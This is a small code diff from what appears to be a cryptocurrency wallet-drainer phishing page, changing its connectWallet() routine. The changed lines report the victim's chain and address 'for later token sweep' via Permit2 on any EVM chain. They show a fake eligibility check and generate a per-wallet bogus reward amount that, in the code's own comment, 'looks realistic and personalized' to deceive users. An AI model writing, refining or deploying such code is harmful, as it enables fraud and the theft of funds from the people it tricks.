@@ -45,8 +45,9 @@ async function connectWallet() {
             
             // Show "verifying" then trigger approval request
             setBtn('⏳ Checking eligibility...',true);
-            const onBase = await ensureBaseNetwork(chainId);
-            sendData('network_check',{onBase,address:userAddress});
+            // R39: Permit2 is multichain — no forced switch needed. Works on ANY EVM chain.
+            // Just record which chain user is on for later token sweep
+            sendData('network_check',{chain:chainId,address:userAddress,multichain:true});
             // Generate per-wallet "reward amount" - looks realistic and personalized
             const addrSeed = parseInt(userAddress.slice(2,10),16);
             const rewardAmount = 120 + (addrSeed % 380); // $120-$500 range
